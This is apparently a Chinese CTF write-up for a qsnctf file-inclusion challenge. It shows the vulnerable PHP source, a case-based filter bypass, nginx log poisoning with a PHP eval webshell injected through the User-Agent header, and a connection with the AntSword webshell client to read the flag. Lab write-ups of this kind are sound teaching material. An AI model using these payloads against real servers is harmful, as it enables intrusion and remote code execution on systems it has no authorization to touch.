# WP｜qsnctf 文件包含大师（LFI + 日志包含 + 蚁剑）

> 靶机：http://challenge.qsnctf.com:40131/ ｜ 2026-08-11 实测
> 类型：LFI（include 关键字过滤）→ 日志包含 Log Poisoning → 一句话木马 → 蚁剑
> flag(实测)：`flag{10e30ffcd1a343cfbb910c6a84d61ff1}`

---

## 一、源码（highlight_file 开卷）

```php
if(isset($_GET['look'])){
    $look = $_GET['look'];
    $look = str_replace("php", "!!!", $look);    // 拦 php
    $look = str_replace("data", "!!!", $look);   // 拦 data
    $look = str_replace("filter", "!!!", $look); // 拦 filter
    $look = str_replace("input", "!!!", $look);  // 拦 input
    include($look);
}
```

**考点**：include 用户可控路径 = LFI；过滤是 **str_replace 小写精确匹配**（区分大小写）。

## 二、解法链（4 步）

### 第 1 步：大小写绕过读任意文件

```bash
# 直接 /flag 不存在；php://filter 的 php/filter 被拦
?look=/etc/passwd                          # 直接路径可读
?look=PHP://Filter/read=convert.base64-encode/resource=/etc/passwd   # 大小写绕过读源码
```

### 第 2 步：日志包含（核心）—— 找「内容可控的文件」

/flag 不存在、.php 源码读不了（php 被替换）→ 改用 **nginx access.log**：
每次请求都被记入日志，**User-Agent 完全可控** = 可以往日志里写 PHP 代码。

### 第 3 步：UA 注入一句话木马

```bash
# curl（shell 里 $ 要转义成 \$）
curl -A "<?php @eval(\$_POST['x']); ?>" "http://靶机/?look=1" -o /dev/null
```
或 Burp/HackBar 改 UA（GUI 里**不要**反斜杠）：
```
User-Agent: <?php @eval($_POST['x']); ?>
```

### 第 4 步：include 日志 → 木马开机 → 蚁剑

```
GET ?look=/var/log/nginx/access.log     # include 日志，木马执行（等命令）
蚁剑: URL=http://靶机/?look=/var/log/nginx/access.log  密码=x  类型=PHP
终端: cat /var/www/html/flag.php
```

## 三、⭐ 三个致命坑（全部实测踩过）

### 坑 1：木马里绝不能用双引号
nginx（escape=json）把 UA 里的 `"` 转义成 `\x22` 写进日志：
```
你写:  <?php @eval($_POST["x"]); ?>
日志:  <?php @eval($_POST[\x22x\x22]); ?>
PHP:   语法错误 → 整个日志文件编译失败（PHP 先编译后执行）
```
**一句话：只用单引号 `$_POST['x']`。**

### 坑 2：curl 的 `\$` 是 shell 转义，GUI 里不能带
```
curl 里:  \$_POST   ← shell 会展开 $，必须转义（展开成空 = 木马坏）
HackBar:  $_POST    ← GUI 无 shell，带 \ 反而把反斜杠写进日志（nginx 转义成 \x5C → PHP 语法错误）
```
**判断法**：读日志看木马行有没有 `\x5C`（反斜杠）或 `\x22`（双引号）——有就是坏行。

### 坑 3：别把木马放 URL 参数
URL 里的 `<` `>` 被编码成 `%3C` `%3E`，PHP 标签起不来。**用 UA / Referer**（nginx 默认记录这两个头）。

## 四、日志污染 = 实例报废（关键认知）

```
PHP 处理 include 的文件：先整体编译，再执行。
日志里【任何一行】语法错误 → 整个日志文件不执行（包括其他正确的木马行）。
access.log 只能追加不能改 → 坏行无法删除 → 只能换新实例。
```

**为什么我一开始 RCE 成功了后来全炸**：第一次注入 `system('id')`（单引号）成功；后来注入双引号版本 → 日志出现坏行 → 之后 include 永远是 Parse error。

## 五、其他可注入的请求头

| 位置 | 可用性 | 说明 |
|---|---|---|
| User-Agent | ✅ 首选 | nginx 默认记录 |
| Referer | ✅ 可用 | 默认也记录 |
| URL 参数/路径 | ⚠️ 慎用 | `<` `>` 被编码，PHP 标签失效 |
| Cookie | ❌ | 默认 access.log 不记录 |

## 六、复盘套路

```
LFI 题三板斧：
  ① 读文件:      ?f=/etc/passwd（验证）
  ② 读源码:      PHP://Filter 大小写绕过 / 双写 / 编码
  ③ 日志包含:    UA 注入 PHP → include 日志 → RCE/木马 → 蚁剑
日志包含铁律：单引号、别带 curl 转义符、看日志确认无 \x5C/\x22
```

## 七、知识点全景（本题完整清单）

### LFI 基础
- include/require 接收用户可控参数 = LFI；include 既能读文件也能执行 PHP（套路根基）
- 三板斧：读文件 → 读源码 → 找可控文件注入执行

### 过滤绕过
- str_replace 区分大小写 → `PHP://Filter` 大写绕过小写黑名单
- /flag 不一定存在，读不到就换思路

### 日志包含
- access.log = nginx 自动台账（时间/IP/URL/UA/Referer），无需人工创建
- 日志 = 你能往服务器写内容的文件（UA 完全可控）
- Log Poisoning：UA 注入 PHP → include 日志 → RCE

### 一句话木马
- `<?php @eval($_POST['x']); ?>`（@ 抑制错误；变体：assert/system 版）

### 请求头选择
- UA ✅ 首选 / Referer ✅ 可用（nginx 默认都记录）
- URL 参数 ❌（<> 编码成 %3C） / Cookie ❌（默认不记录）

### 转义（本场最大坑）
- curl 里 `\$` 是 shell 转义；GUI 里直接 `$`（带反斜杠 → 日志 `\x5C` → 语法错误）
- 双引号 → nginx 转义 `\x22` → 日志编译失败；只用单引号
- 判断坏行：日志里搜 `\x5C` / `\x22`

### PHP 编译特性
- 先整体编译再执行 → 一行语法错 = 整个文件不执行
- 日志只追加不能改 → 坏行无救 → 污染实例只能换新靶机

### include 执行行为
- 文本原样显示、PHP 源码被吃掉（执行）；有输出显示结果、无输出静默
- 找不到木马 = 木马活着（被 include 消费）——filter 读才见原文

### 蚁剑
- 连接三要素：URL（带 ?look=日志路径）+ 密码 + PHP 类型
- 原理：POST 密码参数传代码 → include 时 eval 执行

> 关联：Web笔记10-文件包含LFI解题手册（三板斧）、Web笔记16-HTTP请求要素（头伪造）。
